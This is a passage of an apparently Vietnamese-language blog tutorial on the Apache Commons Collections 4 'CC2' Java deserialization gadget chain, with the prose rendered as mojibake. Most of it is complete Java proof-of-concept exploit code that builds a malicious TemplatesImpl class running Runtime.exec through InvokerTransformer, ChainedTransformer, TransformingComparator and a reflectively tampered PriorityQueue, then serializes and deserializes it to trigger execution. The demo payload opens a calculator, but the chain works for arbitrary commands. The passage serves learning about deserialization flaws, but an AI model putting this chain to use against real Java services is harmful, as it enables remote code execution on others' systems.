org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//invokerTransformer.transform(templates);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        <span class="comment">//transformingComparator.compare(null, null);</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>();</span><br><span class="line">        priorityQueue.add(<span class="number">0</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//        priorityQueue.add(templates);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        Field queue=priorityQueue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,templates&#125;);</span><br><span class="line">        <span class="comment">//Sau khi set, queue[0], queue[1] trá»Ÿ thÃ nh TemplateImpl</span></span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Su-dung-ChainedTransformer"><a href="#Su-dung-ChainedTransformer" class="headerlink" title="Sá»­ dá»¥ng ChainedTransformer"></a>Sá»­ dá»¥ng ChainedTransformer</h3><p>Vá» ChainedTransformer mÃ¬nh Ä‘Ã£ giáº£i thÃ­ch á»Ÿ CC1-TransformedMap, cÃ¡c báº¡n cÃ³ thá»ƒ xem láº¡i á»Ÿ bÃ i viáº¿t Ä‘Ã³.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(templates),</span><br><span class="line">                invokerTransformer</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//invokerTransformer.transform(templates);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>( chainedTransformer);</span><br><span class="line">        transformingComparator.compare(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tuy nhiÃªn, chÃºng ta gáº·p má»™t váº¥n Ä‘á» lÃ  mÃ¡y tÃ­nh Ä‘Æ°á»£c báº­t lÃªn trÆ°á»›c khi serialize object, dáº«n Ä‘áº¿n viá»‡c dá»«ng chÆ°Æ¡ng trÃ¬nh nhÆ° Ä‘oáº¡n mÃ£ dÆ°á»›i Ä‘Ã¢y.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(templates),</span><br><span class="line">                invokerTransformer</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//invokerTransformer.transform(templates);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>( chainedTransformer);</span><br><span class="line">        <span class="comment">//transformingComparator.compare(null, null);</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Äá»ƒ giáº£i quyáº¿t váº¥n Ä‘á» nÃ y, chÃºng ta sáº½ set giÃ¡ trá»‹ vÃ o sau khi Queue Ä‘Ã£ add xong:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] faketransformer=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(templates),</span><br><span class="line">                invokerTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>( chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        Class class=ChainedTransformer.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformersField</span> <span class="operator">=</span> class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformersField.set(chainedTransformer,transformers);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MÃ¡y tÃ­nh Ä‘Ã£ Ä‘Æ°á»£c báº­t lÃªn.</p><h2 id="Loi-ket"><a href="#Loi-ket" class="headerlink" title="Lá»i káº¿t"></a>Lá»i káº¿t</h2><p>MÃ¬nh Ä‘Ã£ hoÃ n thÃ nh cc2 theo hai hÆ°á»›ng lÃ  ChainedTransformer vÃ  hÆ°á»›ng set giÃ¡ trá»‹ cho queue. Náº¿u thuáº§n cc2 thÃ¬ sáº½ theo hÆ°á»›ng queue, kiáº¿n thÆ°á»›c khÃ¡c vá»›i cc1 nÃªn cÃ¡c báº¡n cÃ³ thá»ƒ sáº½ tháº¥y ngá»£p lÃºc Ä‘áº§u, mÃ¬nh cÅ©ng Ä‘Ã£ giáº£i thÃ­ch kÄ© á»Ÿ pháº§n Ä‘Ã³, hi vá»ng sáº½ giÃºp cÃ¡c báº¡n há»c nhanh hÆ¡n vÃ  khÃ´ng cáº£m tháº¥y khÃ³ khÄƒn.<br>LÃºc Ä‘áº§u phÃ¢n tÃ­ch mÃ¬nh cÅ©ng tháº¥y khÃ³ hiá»ƒu vÃ  betak, nhÆ°ng sau mÃ¬nh cá»‘ gáº¯ng ngá»“i láº¡i Ä‘á»ƒ phÃ¢n tÃ­ch thÃ¬ dáº§n dáº§n cÅ©ng tháº¥y á»•n hÆ¡n, mong cÃ¡c báº¡n khÃ´ng nhÆ° mÃ¬nh :).</p><blockquote><p>ChÃºc cÃ¡c báº¡n há»c tá»‘t~</p></blockquote>]]></content:encoded>
      
      
      <category domain="https://rayinaw.github.io/categories/Java/">Java</category>
      
      <category domain="https://rayinaw.github.io/categories/Java/Deserialization/">Deserialization</category>
      
      
      <category domain="https://rayinaw.github.io/tags/Java/">Java</category>
      
